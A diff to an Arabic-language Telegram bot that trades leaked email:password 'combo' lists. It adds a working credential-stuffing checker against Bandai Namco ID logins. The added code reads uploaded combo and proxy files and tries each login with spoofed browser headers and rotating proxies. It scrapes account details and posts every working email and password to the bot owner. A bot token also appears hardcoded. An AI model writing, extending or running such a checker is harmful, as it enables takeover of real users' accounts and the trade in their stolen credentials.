@@ -7,6 +7,9 @@ import asyncio
 import math
 import time
 import random
+import threading
+import requests
+import shutil
 from datetime import datetime, date, timedelta
 from collections import Counter, defaultdict
 from pyrogram import Client, filters
@@ -18,6 +21,8 @@ from pyrogram.errors import (
     FloodWait, UserIsBlocked, InputUserDeactivated,
     ChatAdminRequired, UserNotParticipant, ChannelPrivate, PeerIdInvalid
 )
+from bs4 import BeautifulSoup
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 # ==================== الإعدادات ====================
 API_ID = int(os.getenv("API_ID", "20084899"))
@@ -26,6 +31,11 @@ BOT_TOKEN = os.getenv("BOT_TOKEN", "8839466034:AAF_ONFjOcoOSrcQtiTRrtWlTQJCDtR-C
 
 OWNER_IDS = [int(x) for x in os.getenv("OWNER_IDS", "8604513259,7105884739").split(",") if x.strip()]
 DB_PATH = os.getenv("DB_PATH", "combos.db")
+
+# مسارات الملفات - استخدام مسار العمل الحالي
+WORK_DIR = os.path.dirname(os.path.abspath(__file__))
+CHECKER_COMBO_PATH = os.path.join(WORK_DIR, "checker_combos.txt")
+CHECKER_PROXY_PATH = os.path.join(WORK_DIR, "checker_proxies.txt")
 
 bot_enabled_for_users = True
 ulp_feature_enabled = False
@@ -41,7 +51,6 @@ DAILY_REWARD_BASE = 0.5
 ADVANCED_REFERRAL_REWARD = 0.5
 BIG_WITHDRAWAL_THRESHOLD = 5000
 
-# قائمة الباسوردات الجديدة للتعديل
 PASSWORD_REPLACEMENTS = [
     "Aa123456",
     "Aa123456@",
@@ -51,12 +60,28 @@ PASSWORD_REPLACEMENTS = [
     "Aa@123456"
 ]
 
+# متغيرات الفحص
+checker_active = False
+checker_lock = threading.Lock()
+checker_proxy_list = []
+checker_failed_proxies = set()
+checker_results_lock = threading.Lock()
+checker_stats = {
+    'total': 0,
+    'checked': 0,
+    'valid': 0,
+    'invalid': 0,
+    'start_time': None,
+    'last_update': None
+}
+counter_message_id = None
+
 app = Client(
     "combo_bot",
     api_id=API_ID,
     api_hash=API_HASH,
     bot_token=BOT_TOKEN,
-    workdir="/tmp" if os.path.exists("/tmp") else "."
+    workdir=WORK_DIR
 )
 
 # ==================== قاعدة البيانات ====================
@@ -181,16 +206,6 @@ def init_db():
             notified INTEGER DEFAULT 0,
             created_at TEXT DEFAULT CURRENT_TIMESTAMP,
             PRIMARY KEY (user_id, domain)
-        )
-    ''')
-
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS user_tasks (
-            user_id INTEGER NOT NULL,
-            task_name TEXT NOT NULL,
-            progress INTEGER DEFAULT 0,
-            completed INTEGER DEFAULT 0,
-            PRIMARY KEY (user_id, task_name)
         )
     ''')
 
@@ -386,7 +401,7 @@ def update_user_level(user_id: int):
 def get_level_emoji(level: str) -> str:
     return {"ذهبي": "🥇", "فضي": "🥈", "عادي": "🥉"}.get(level, "🥉")
 
-# ==================== سجل السحوبات + الإحالة ====================
+# ==================== سجل السحوبات ====================
 def record_withdrawal(user_id: int, domain: str, amount: int, points_spent: float):
     conn = get_db()
     cursor = conn.cursor()
@@ -856,95 +871,365 @@ def get_most_active_users(limit: int = 10):
     conn.close()
     return rows
 
-# ==================== دوال معالجة الملفات والنسخ المزدوج ====================
-def process_duplicate_file(file_path: str, domain: str) -> tuple:
-    """
-    معالجة الملف وإنشاء نسختين:
-    1- النسخة الأصلية: نفس المحتوى بدون تعديل
-    2- النسخة المعدلة: نفس الإيميلات مع تغيير الباسوردات إلى القائمة المحددة
-    """
-    original_lines = []
-    modified_lines = []
-    
-    # قراءة الملف
-    for enc in ['utf-8-sig', 'utf-8', 'latin-1', 'cp1252', 'utf-16']:
-        try:
-            with open(file_path, 'r', encoding=enc, errors='ignore') as f:
-                for line in f:
-                    line_str = line.strip()
-                    if line_str:
-                        original_lines.append(line_str)
-            break
-        except Exception:
-            continue
-    
-    if not original_lines:
-        return None, None
-    
-    # إنشاء النسخة المعدلة
-    for line in original_lines:
-        parts = line.split(':')
-        if len(parts) >= 2:
-            email = parts[0]
-            new_password = random.choice(PASSWORD_REPLACEMENTS)
-            modified_lines.append(f"{email}:{new_password}")
-        else:
-            modified_lines.append(line)
-    
-    return original_lines, modified_lines
+# ==================== دوال الفحص ====================
+def normalize_proxy(proxy_str):
+    if not proxy_str:
+        return None
+    proxy_str = proxy_str.strip()
+    if '@' in proxy_str:
+        if not proxy_str.startswith('http://') and not proxy_str.startswith('https://'):
+            proxy_str = 'http://' + proxy_str
+        return proxy_str
+    if proxy_str.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
+        return proxy_str
+    if not proxy_str.startswith('http://') and not proxy_str.startswith('https://'):
+        proxy_str = 'http://' + proxy_str
+    temp = proxy_str.replace('http://', '').replace('https://', '')
+    parts = temp.split(':')
+    if len(parts) == 4:
+        host, port, user, password = parts
+        return f"http://{user}:{password}@{host}:{port}"
+    elif len(parts) == 2:
+        return proxy_str
+    else:
+        return proxy_str
 
-async def owner_full_withdrawal(client: Client, domain: str, limit_count: int, message: Message):
-    """
-    دالة خاصة بسحب المالك - شاملة 100% بدون استثناءات
-    تقوم بجلب كافة الحسابات المتاحة للدومين المطلوب مع إنشاء نسختين
-    """
-    # جلب الكومبوهات من قاعدة البيانات
-    results = await fetch_and_delete_combos(domain, limit_count)
+def extract_user_info(html_content):
+    user_data = {
+        'username': None,
+        'account_id': None,
+        'player_rank': None,
+        'email': None,
+        'is_linked': False,
+        'has_game_data': False
+    }
     
-    if not results:
-        await message.reply(f"❌ لا توجد حسابات للدومين `{domain}`.")
+    soup = BeautifulSoup(html_content, 'html.parser')
+    
+    username_elem = soup.find('p', {'class': 'top-contents-user-info'})
+    if username_elem:
+        user_data['username'] = username_elem.get_text(strip=True)
+    
+    account_id_elem = soup.find('dd', string=re.compile(r'[A-Z0-9]{10,}'))
+    if account_id_elem:
+        user_data['account_id'] = account_id_elem.get_text(strip=True)
+    else:
+        match = re.search(r'[A-Z0-9]{10,}', html_content)
+        if match:
+            user_data['account_id'] = match.group(0)
+    
+    player_rank = None
+    
+    rank_patterns = [
+        r'Player Rank</dt>\s*<dd><a>(\d+)</a></dd>',
+        r'"playerRank"\s*:\s*"?(\d+)"?',
+        r'"rank"\s*:\s*"?(\d+)"?',
+        r'<dd><a>(\d+)</a></dd>',
+        r'<span[^>]*class="[^"]*rank[^"]*"[^>]*>(\d+)</span>',
+        r'رتبة اللاعب[:]\s*(\d+)',
+        r'レベル[:]\s*(\d+)',
+    ]
+    
+    for pattern in rank_patterns:
+        match = re.search(pattern, html_content, re.IGNORECASE)
+        if match:
+            player_rank = match.group(1).strip()
+            if player_rank.isdigit() and int(player_rank) > 0 and int(player_rank) < 999:
+                break
+    
+    if not player_rank:
+        for dd in soup.find_all('dd'):
+            text = dd.get_text(strip=True)
+            if text.isdigit() and 1 <= int(text) <= 999:
+                parent = dd.find_parent()
+                if parent and 'user-info' in str(parent):
+                    player_rank = text
+                    break
+    
+    user_data['player_rank'] = player_rank
+    
+    email_match = re.search(r'<a>([^<]+@[^<]+)</a>', html_content)
+    if email_match:
+        user_data['email'] = email_match.group(1)
+    else:
+        email_match2 = re.search(r'"email"\s*:\s*"([^"]+@[^"]+)"', html_content)
+        if email_match2:
+            user_data['email'] = email_match2.group(1)
+    
+    if 'No game account was found linked' in html_content:
+        user_data['is_linked'] = False
+    elif 'إجراءات الربط' in html_content:
+        user_data['is_linked'] = False
+    else:
+        user_data['is_linked'] = True
+    
+    has_game_data = False
+    
+    if user_data.get('is_linked'):
+        username = user_data.get('username', '')
+        if username and username.lower() not in ['not logged in', 'guest', '']:
+            if user_data.get('player_rank') and user_data.get('player_rank').isdigit():
+                if int(user_data.get('player_rank')) > 0:
+                    has_game_data = True
+        
+        account_id = user_data.get('account_id', '')
+        if account_id and account_id != '67829150454' and len(account_id) >= 10:
+            has_game_data = True
+    
+    user_data['has_game_data'] = has_game_data
+    
+    return user_data
+
+def perform_full_login(email, password, proxy=None):
+    session = requests.Session()
+    
+    if proxy:
+        try:
+            session.proxies = {
+                'http': proxy,
+                'https': proxy
+            }
+        except Exception:
+            pass
+    
+    headers = {
+        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
+        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        'upgrade-insecure-requests': "1",
+        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
+    }
+    
+    try:
+        main_url = "https://ww.bandainamcoentwebstore.com/opbr-ww/en"
+        main_response = session.get(main_url, headers=headers, timeout=15)
+        
+        if main_response.status_code != 200:
+            return None
+        
+        login_url = "https://account-api.bandainamcoid.com/v3/login/idpw"
+        
+        payload = {
+            'client_id': "FXpKtpYzmcZIH0d5R2AX2KwJmO8btruHY8yoZe2f",
+            'redirect_uri': "https://ww.bandainamcoentwebstore.com/opbr-ww/en/callback",
+            'backto': "",
+            'customize_id': "",
+            'login_id': email,
+            'password': password,
+            'retention': "1",
+            'language': "ar",
+            'cookie': '{"language":"ar","retention_tmp":"1","mnwlogindata":"6320b99de33868d68ad4f258f4ae387a6ce098e889a344b79af2e49deefd02c8decff42f4ed7ace385ee11bc0da5503f78a2e527f776285f68e312c07ac06e41","retention":"1","OptanonAlertBoxClosed":"2026-07-06T06:42:54.377Z","passkeyInfoProd":"220d7837-6359-4f5d-b7a5-a42b5ddbdda6","OptanonConsent":"isGpcEnabled=0&datestamp=Thu+Jul+09+2026+00:50:23+GMT+0300+(التوقيت+العربي+الرسمي)&version=202505.2.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=39170fc3-a8f6-47d3-9a08-5ea6da26a2dd&interactionCount=2&isAnonUser=1&landingPath=NotLandingPage&groups=C0004:0,C0003:0,C0002:0,C0001:1&AwaitingReconsent=false&intType=2&geolocation=IQ;BG","challengeProd":"36680055-3800-4e55-9c28-3949bfd6b4b7"}',
+            'prompt': ""
+        }
+        
+        login_headers = {
+            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36",
+            'Accept': "application/json, text/javascript, */*; q=0.01",
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
+            'sec-ch-ua-mobile': '?1',
+            'origin': "https://account.bandainamcoid.com",
+            'sec-fetch-site': "same-site",
+            'sec-fetch-mode': "cors",
+            'sec-fetch-dest': "empty",
+            'referer': "https://account.bandainamcoid.com/",
+            'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
+            'priority': "u=1, i"
+        }
+        
+        login_response = session.post(login_url, data=payload, headers=login_headers, timeout=15)
+        
+        if login_response.status_code != 200:
+            return None
+        
+        try:
+            login_json = login_response.json()
+        except:
+            return None
+        
+        if login_json.get("result") != "OK":
+            return None
+        
+        redirect_url = login_json.get("redirect")
+        if redirect_url:
+            session.get(redirect_url, headers=headers, timeout=15)
+        
+        time.sleep(0.5)
+        
+        store_response = session.get(main_url, headers=headers, timeout=15)
+        
+        if store_response.status_code != 200:
+            return None
+        
+        user_data = extract_user_info(store_response.text)
+        
+        if user_data.get('has_game_data'):
+            return {
+                'email': email,
+                'password': password,
+                'user_data': user_data,
+                'is_valid': True
+            }
+        else:
+            return None
+        
+    except Exception:
+        return None
+
+def process_single_account_checker(email, password):
+    result = perform_full_login(email, password, None)
+    if result:
+        return result
+    
+    proxy = None
+    with checker_lock:
+        available = [p for p in checker_proxy_list if p not in checker_failed_proxies]
+        if available:
+            proxy = random.choice(available)
+    
+    if proxy:
+        result = perform_full_login(email, password, proxy)
+        if result:
+            return result
+    
+    return None
+
+async def update_counter_message(client: Client, chat_id: int):
+    global counter_message_id
+    while checker_active:
+        try:
+            if checker_stats['total'] > 0 and checker_stats['start_time']:
+                progress = (checker_stats['checked'] / checker_stats['total']) * 100 if checker_stats['total'] > 0 else 0
+                elapsed = int(time.time() - checker_stats['start_time']) if checker_stats['start_time'] else 0
+                text = (
+                    f"📊 <b>عداد الفحص المباشر</b>\n\n"
+                    f"📁 إجمالي الحسابات: <b>{checker_stats['total']:,}</b>\n"
+                    f"✅ تم الفحص: <b>{checker_stats['checked']:,}</b> ({progress:.1f}%)\n"
+                    f"🎯 الحسابات الصالحة: <b>{checker_stats['valid']:,}</b>\n"
+                    f"❌ الحسابات الفاشلة: <b>{checker_stats['invalid']:,}</b>\n"
+                    f"⏱️ الوقت المنقضي: <b>{elapsed} ثانية</b>"
+                )
+                
+                if counter_message_id:
+                    try:
+                        await client.edit_message_text(chat_id, counter_message_id, text)
+                    except:
+                        pass
+                else:
+                    msg = await client.send_message(chat_id, text)
+                    counter_message_id = msg.id
+        except:
+            pass
+        
+        await asyncio.sleep(300)
+
+async def run_checker(client: Client, chat_id: int, combo_file_path: str, proxies_file_path: str = None):
+    global checker_active, counter_message_id, checker_proxy_list, checker_failed_proxies
+    
+    if checker_active:
+        await client.send_message(chat_id, "⚠️ الفحص جاري بالفعل!")
         return
     
-    # إنشاء ملفين: الأصلي والمعدل
-    # النسخة الأصلية
-    original_content = "\n".join(results)
-    original_file = io.BytesIO(original_content.encode("utf-8"))
-    original_file.name = f"{domain}_original_{len(results)}.txt"
+    if not os.path.exists(combo_file_path):
+        await client.send_message(chat_id, "❌ ملف الحسابات غير موجود! أضف الملف أولاً.")
+        return
     
-    # النسخة المعدلة (تغيير الباسوردات)
-    modified_lines = []
-    for line in results:
-        parts = line.split(':')
-        if len(parts) >= 2:
-            email = parts[0]
-            new_password = random.choice(PASSWORD_REPLACEMENTS)
-            modified_lines.append(f"{email}:{new_password}")
-        else:
-            modified_lines.append(line)
+    checker_active = True
+    checker_stats['total'] = 0
+    checker_stats['checked'] = 0
+    checker_stats['valid'] = 0
+    checker_stats['invalid'] = 0
+    checker_stats['start_time'] = time.time()
+    counter_message_id = None
     
-    modified_content = "\n".join(modified_lines)
-    modified_file = io.BytesIO(modified_content.encode("utf-8"))
-    modified_file.name = f"{domain}_modified_{len(results)}.txt"
+    checker_proxy_list = []
+    checker_failed_proxies = set()
+    if proxies_file_path and os.path.exists(proxies_file_path):
+        try:
+            with open(proxies_file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                for line in f:
+                    line = line.strip()
+                    if line and not line.startswith('#'):
+                        normalized = normalize_proxy(line)
+                        if normalized:
+                            checker_proxy_list.append(normalized)
+        except:
+            pass
     
-    # إرسال الملفين
-    await client.send_document(
-        chat_id=message.chat.id,
-        document=original_file,
-        caption=f"📄 <b>النسخة الأصلية</b>\n🌐 الدومين: `{domain}`\n📊 العدد: <b>{len(results):,}</b> حساب\n✅ بدون أي تعديل على الإيميلات أو الباسوردات"
+    accounts = []
+    try:
+        with open(combo_file_path, 'r', encoding='utf-8', errors='ignore') as f:
+            for line in f:
+                line = line.strip()
+                if line and ':' in line and not line.startswith('#'):
+                    parts = line.split(':', 1)
+                    if len(parts) == 2:
+                        accounts.append((parts[0].strip(), parts[1].strip()))
+    except:
+        pass
+    
+    if not accounts:
+        await client.send_message(chat_id, "❌ لا توجد حسابات صالحة في الملف")
+        checker_active = False
+        return
+    
+    checker_stats['total'] = len(accounts)
+    
+    await client.send_message(chat_id, f"🚀 بدأ الفحص!\n📁 إجمالي الحسابات: <b>{len(accounts):,}</b>\n🔢 عدد الخيوط: <b>3</b>")
+    
+    asyncio.create_task(update_counter_message(client, chat_id))
+    
+    valid_results = []
+    batch_size = 15
+    
+    for batch_idx in range(0, len(accounts), batch_size):
+        batch = accounts[batch_idx:batch_idx + batch_size]
+        
+        with ThreadPoolExecutor(max_workers=3) as executor:
+            futures = {executor.submit(process_single_account_checker, email, pwd): (email, pwd) for email, pwd in batch}
+            
+            for future in as_completed(futures):
+                try:
+                    result = future.result(timeout=60)
+                    with checker_results_lock:
+                        checker_stats['checked'] += 1
+                        if result:
+                            checker_stats['valid'] += 1
+                            valid_results.append(result)
+                            user_data = result['user_data']
+                            message = (
+                                f"✅ <b>حساب نشط مع معلومات لعبة</b>\n\n"
+                                f"📧 الإيميل: <code>{result['email']}</code>\n"
+                                f"🔑 كلمة المرور: <code>{result['password']}</code>\n"
+                                f"👤 الاسم: <code>{user_data.get('username', 'غير موجود')}</code>\n"
+                                f"🆔 Account ID: <code>{user_data.get('account_id', 'غير موجود')}</code>\n"
+                                f"📊 Player Rank: <code>{user_data.get('player_rank', 'غير موجود')}</code>\n"
+                                f"🔗 حالة الربط: {'مرتبط ✅' if user_data.get('is_linked') else 'غير مرتبط ❌'}"
+                            )
+                            await client.send_message(chat_id, message)
+                        else:
+                            checker_stats['invalid'] += 1
+                except Exception:
+                    with checker_results_lock:
+                        checker_stats['checked'] += 1
+                        checker_stats['invalid'] += 1
+        
+        time.sleep(1)
+    
+    checker_active = False
+    
+    elapsed = int(time.time() - checker_stats['start_time']) if checker_stats['start_time'] else 0
+    final_text = (
+        f"📊 <b>التقرير النهائي للفحص</b>\n\n"
+        f"📁 إجمالي الحسابات: <b>{checker_stats['total']:,}</b>\n"
+        f"✅ تم الفحص: <b>{checker_stats['checked']:,}</b>\n"
+        f"🎯 الحسابات الصالحة: <b>{checker_stats['valid']:,}</b>\n"
+        f"❌ الحسابات الفاشلة: <b>{checker_stats['invalid']:,}</b>\n"
+        f"⏱️ الوقت الإجمالي: <b>{elapsed} ثانية</b>"
     )
-    
-    await client.send_document(
-        chat_id=message.chat.id,
-        document=modified_file,
-        caption=f"🔄 <b>النسخة المعدلة</b>\n🌐 الدومين: `{domain}`\n📊 العدد: <b>{len(results):,}</b> حساب\n🔑 تم تغيير الباسوردات إلى القائمة المحددة"
-    )
-    
-    # تسجيل العملية
-    record_withdrawal(message.from_user.id, domain, len(results), 0)
-    log_search_domain(domain)
-    increment_operations()
-    
-    await message.reply(f"✅ تم سحب <b>{len(results):,}</b> حساب للدومين `{domain}` وإرسال نسختين (أصلية ومعدلة).")
+    await client.send_message(chat_id, final_text)
 
 # ==================== الكيبوردات ====================
 def owner_keyboard():
@@ -956,10 +1241,11 @@ def owner_keyboard():
         [KeyboardButton("⚙️ إعدادات الاشتراك"), KeyboardButton("📈 عدد العمليات")],
         [KeyboardButton("🔥 الأكثر والأقل طلباً"), KeyboardButton("🎁 إنشاء رابط هدية")],
         [KeyboardButton("➕ إرسال نقاط ID"), KeyboardButton("⚙️ نقاط الإحالة")],
-        [KeyboardButton("📢 إضافة إعلان قناة"), KeyboardButton("🧾 قناة السجل (Audit Log)")],
+        [KeyboardButton("📢 إضافة إعلان قناة"), KeyboardButton("🧾 قناة السجل")],
         [KeyboardButton("💎 إحصائيات النقاط"), KeyboardButton("👥 الأكثر نشاطاً")],
         [KeyboardButton("🚫 حظر عضو"), KeyboardButton("✅ فك حظر عضو")],
-        [KeyboardButton("💣 حذف كل البيانات"), KeyboardButton("📈 حالة البوت")]
+        [KeyboardButton("💣 حذف كل البيانات"), KeyboardButton("📈 حالة البوت")],
+        [KeyboardButton("🔐 فحص الحسابات")]
     ], resize_keyboard=True)
 
 def user_keyboard():
@@ -1132,6 +1418,133 @@ async def force_sub_guard(client: Client, message: Message) -> bool:
         return False
     return True
 
+# ==================== أزرار الفحص ====================
+@app.on_message(filters.regex("^🔐 فحص الحسابات$") & filters.user(OWNER_IDS))
+async def checker_menu(client: Client, message: Message):
+    kb = InlineKeyboardMarkup([
+        [InlineKeyboardButton("➕ إضافة ملف حسابات", callback_data="add_combo_file")],
+        [InlineKeyboardButton("🗑 حذف ملف الحسابات", callback_data="delete_combo_file")],
+        [InlineKeyboardButton("➕ إضافة ملف بروكسيات", callback_data="add_proxy_file")],
+        [InlineKeyboardButton("🗑 حذف ملف البروكسيات", callback_data="delete_proxy_file")],
+        [InlineKeyboardButton("🚀 بدء الفحص", callback_data="start_checker")],
+        [InlineKeyboardButton("📊 حالة الفحص", callback_data="checker_status")]
+    ])
+    await message.reply("🔐 <b>قسم فحص الحسابات</b>\n\nاختر العملية المطلوبة:", reply_markup=kb)
+
+@app.on_callback_query(filters.regex("^add_combo_file$") & filters.user(OWNER_IDS))
+async def add_combo_file_cb(client: Client, callback: CallbackQuery):
+    user_action_state[callback.from_user.id] = "awaiting_checker_combo_file"
+    await callback.answer("أرسل ملف الحسابات الآن")
+    await callback.message.edit_text("📁 أرسل ملف الحسابات (email:password لكل سطر)")
+
+@app.on_callback_query(filters.regex("^delete_combo_file$") & filters.user(OWNER_IDS))
+async def delete_combo_file_cb(client: Client, callback: CallbackQuery):
+    if os.path.exists(CHECKER_COMBO_PATH):
+        try:
+            os.remove(CHECKER_COMBO_PATH)
+            await callback.answer("تم حذف ملف الحسابات", show_alert=True)
+            await callback.message.edit_text("🗑 تم حذف ملف الحسابات من الاستضافة")
+        except Exception as e:
+            await callback.answer(f"خطأ: {e}", show_alert=True)
+    else:
+        await callback.answer("لا يوجد ملف حسابات", show_alert=True)
+        await callback.message.edit_text("⚠️ لا يوجد ملف حسابات محفوظ")
+
+@app.on_callback_query(filters.regex("^add_proxy_file$") & filters.user(OWNER_IDS))
+async def add_proxy_file_cb(client: Client, callback: CallbackQuery):
+    user_action_state[callback.from_user.id] = "awaiting_checker_proxy_file"
+    await callback.answer("أرسل ملف البروكسيات الآن")
+    await callback.message.edit_text("📁 أرسل ملف البروكسيات")
+
+@app.on_callback_query(filters.regex("^delete_proxy_file$") & filters.user(OWNER_IDS))
+async def delete_proxy_file_cb(client: Client, callback: CallbackQuery):
+    if os.path.exists(CHECKER_PROXY_PATH):
+        try:
+            os.remove(CHECKER_PROXY_PATH)
+            await callback.answer("تم حذف ملف البروكسيات", show_alert=True)
+            await callback.message.edit_text("🗑 تم حذف ملف البروكسيات من الاستضافة")
+        except Exception as e:
+            await callback.answer(f"خطأ: {e}", show_alert=True)
+    else:
+        await callback.answer("لا يوجد ملف بروكسيات", show_alert=True)
+        await callback.message.edit_text("⚠️ لا يوجد ملف بروكسيات محفوظ")
+
+@app.on_callback_query(filters.regex("^start_checker$") & filters.user(OWNER_IDS))
+async def start_checker_cb(client: Client, callback: CallbackQuery):
+    if not os.path.exists(CHECKER_COMBO_PATH):
+        await callback.answer("لا يوجد ملف حسابات! أضف ملف أولاً", show_alert=True)
+        return
+    
+    await callback.answer("جارِ بدء الفحص...")
+    await callback.message.edit_text("🚀 بدأ الفحص...")
+    
+    proxies = CHECKER_PROXY_PATH if os.path.exists(CHECKER_PROXY_PATH) else None
+    asyncio.create_task(run_checker(client, callback.message.chat.id, CHECKER_COMBO_PATH, proxies))
+
+@app.on_callback_query(filters.regex("^checker_status$") & filters.user(OWNER_IDS))
+async def checker_status_cb(client: Client, callback: CallbackQuery):
+    if checker_active and checker_stats['start_time']:
+        progress = (checker_stats['checked'] / checker_stats['total']) * 100 if checker_stats['total'] > 0 else 0
+        elapsed = int(time.time() - checker_stats['start_time'])
+        text = (
+            f"📊 <b>حالة الفحص الحالية</b>\n\n"
+            f"📁 إجمالي الحسابات: <b>{checker_stats['total']:,}</b>\n"
+            f"✅ تم الفحص: <b>{checker_stats['checked']:,}</b> ({progress:.1f}%)\n"
+            f"🎯 الحسابات الصالحة: <b>{checker_stats['valid']:,}</b>\n"
+            f"❌ الحسابات الفاشلة: <b>{checker_stats['invalid']:,}</b>\n"
+            f"⏱️ الوقت المنقضي: <b>{elapsed} ثانية</b>"
+        )
+    else:
+        text = "📊 <b>لا يوجد فحص جاري حالياً</b>"
+    
+    await callback.answer("تم التحديث")
+    await callback.message.edit_text(text)
+
+@app.on_message(filters.document & filters.user(OWNER_IDS))
+async def handle_checker_files(client: Client, message: Message):
+    user_id = message.from_user.id
+    state = user_action_state.get(user_id)
+    
+    if state == "awaiting_checker_combo_file":
+        user_action_state.pop(user_id, None)
+        try:
+            temp_path = await message.download()
+            if temp_path and os.path.exists(temp_path):
+                shutil.copy2(temp_path, CHECKER_COMBO_PATH)
+                os.remove(temp_path)
+                
+                with open(CHECKER_COMBO_PATH, 'r', encoding='utf-8', errors='ignore') as f:
+                    count = sum(1 for line in f if line.strip() and ':' in line)
+                
+                await message.reply(f"✅ تم حفظ ملف الحسابات!\n📁 عدد الحسابات: <b>{count:,}</b>")
+            else:
+                await message.reply("❌ فشل تحميل الملف")
+        except Exception as e:
+            await message.reply(f"❌ خطأ: {e}")
+        return
+    
+    if state == "awaiting_checker_proxy_file":
+        user_action_state.pop(user_id, None)
+        try:
+            temp_path = await message.download()
+            if temp_path and os.path.exists(temp_path):
+                shutil.copy2(temp_path, CHECKER_PROXY_PATH)
+                os.remove(temp_path)
+                
+                with open(CHECKER_PROXY_PATH, 'r', encoding='utf-8', errors='ignore') as f:
+                    count = sum(1 for line in f if line.strip())
+                
+                await message.reply(f"✅ تم حفظ ملف البروكسيات!\n📁 عدد البروكسيات: <b>{count:,}</b>")
+            else:
+                await message.reply("❌ فشل تحميل الملف")
+        except Exception as e:
+            await message.reply(f"❌ خطأ: {e}")
+        return
+    
+    if user_action_state.get(user_id) == "awaiting_ulp_upload":
+        await handle_large_document(client, message)
+        return
+
 # ==================== فرز ULP ====================
 @app.on_message(filters.command("stop") & filters.user(OWNER_IDS))
 async def stop_ulp_feature(client: Client, message: Message):
@@ -1163,80 +1576,6 @@ async def cancel_ulp_filter_cb(client: Client, callback: CallbackQuery):
     user_filter_keywords.pop(user_id, None)
     await callback.answer("تم الإلغاء.")
     await callback.message.edit_text("❌ تم إلغاء الفرز.")
-
-@app.on_message(filters.document)
-async def process_ulp_document_filter(client: Client, message: Message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        return
-
-    if user_action_state.get(user_id) == "awaiting_ulp_upload":
-        await handle_large_document(client, message)
-        return
-
-    global ulp_feature_enabled
-    if not ulp_feature_enabled:
-        return
-
-    keywords = user_filter_keywords.get(user_id)
-    if not keywords:
-        return
-
-    saved_ulp_path = None
-    output_filename = None
-    try:
-        file_name = message.document.file_name or "data.ulp"
-        msg = await message.reply("⏳ جاري تنزيل الملف والفرز...")
-        saved_ulp_path = await client.download_media(message)
-
-        filtered_lines = []
-        seen = set()
-        keywords_lower = [k.lower().strip() for k in keywords if k.strip()]
-
-        def strict_match(line: str, keys: list) -> bool:
-            line_l = line.lower().strip()
-            if not line_l:
-                return False
-            for key in keys:
-                if key in line_l:
-                    return True
-            return False
-
-        for enc in ['utf-8-sig', 'utf-8', 'latin-1', 'cp1252', 'utf-16']:
-            try:
-                with open(saved_ulp_path, 'r', encoding=enc, errors='ignore') as f:
-                    for line in f:
-                        line_str = line.strip()
-                        if line_str and strict_match(line_str, keywords_lower):
-                            if line_str not in seen:
-                                seen.add(line_str)
-                                filtered_lines.append(line_str)
-                break
-            except Exception:
-                continue
-
-        if not filtered_lines:
-            await msg.edit_text("❌ لم يتم العثور على نتائج مطابقة.")
-        else:
-            output_filename = f"Filtered_{file_name}"
-            with open(output_filename, "w", encoding="utf-8") as out_f:
-                out_f.write("\n".join(filtered_lines))
-
-            await client.send_document(
-                chat_id=message.chat.id,
-                document=output_filename,
-                caption=f"✅ تم الفرز بنجاح!\nالنتائج: <b>{len(filtered_lines):,}</b> سطر"
-            )
-            await msg.delete()
-    except Exception as e:
-        await message.reply(f"❌ خطأ: {e}")
-    finally:
-        if saved_ulp_path and os.path.exists(saved_ulp_path):
-            os.remove(saved_ulp_path)
-        if output_filename and os.path.exists(output_filename):
-            os.remove(output_filename)
-        user_filter_keywords.pop(user_id, None)
-        user_action_state.pop(user_id, None)
 
 # ==================== أوامر الأعضاء ====================
 @app.on_message(filters.regex("^💰 رصيدي ونقاطي$"))
@@ -1310,7 +1649,7 @@ async def ask_domain(client: Client, message: Message):
     user_action_state[user_id] = "awaiting_search_domain"
     await message.reply("📝 أرسل الدومين المطلوب:")
 
-@app.on_message(filters.text & ~filters.regex(r"^(🔍|📤|📊|🗑|✅|🚫|💣|📈|📢|⚙️|🔥|🎁|➕|💰|🔗|📺|💎|📋|👥|📂)"))
+@app.on_message(filters.text & ~filters.regex(r"^(🔍|📤|📊|🗑|✅|🚫|💣|📈|📢|⚙️|🔥|🎁|➕|💰|🔗|📺|💎|📋|👥|📂|🔐)"))
 async def process_text_inputs(client: Client, message: Message):
     user_id = message.from_user.id
     text_input = message.text.strip()
@@ -1326,7 +1665,6 @@ async def process_text_inputs(client: Client, message: Message):
         user_action_state.pop(user_id, None)
         domain = text_input.lower()
         
-        # التحقق من وجود الحسابات
         available = count_available_combos(domain)
         
         if available == 0:
@@ -1334,13 +1672,11 @@ async def process_text_inputs(client: Client, message: Message):
             await message.reply("❌ لا توجد حسابات حالياً. تم إضافتك لقائمة الانتظار.")
             return
 
-        # إذا كان المالك - سحب كامل وشامل
         if is_owner(user_id):
             await message.reply(f"👑 <b>سحب المالك</b>\n🌐 الدومين: `{domain}`\n📊 المتاح: <b>{available:,}</b> حساب\n⏳ جاري السحب الشامل...")
             await owner_full_withdrawal(client, domain, available, message)
             return
         
-        # للمستخدمين العاديين - عرض أزرار الاختيار
         markup = InlineKeyboardMarkup([
             [InlineKeyboardButton("100", callback_data=f"get_{domain}_100"),
              InlineKeyboardButton("500", callback_data=f"get_{domain}_500"),
@@ -1353,7 +1689,6 @@ async def process_text_inputs(client: Client, message: Message):
         await message.reply(f"🎯 متاح لـ `{domain}`: <b>{available:,}</b>\nاختر الكمية:", reply_markup=markup)
         return
 
-    # معالجة الحالات الإدارية الإضافية لضمان عمل الأزرار بالكامل
     if is_owner(user_id):
         if state == "awaiting_delete_domain":
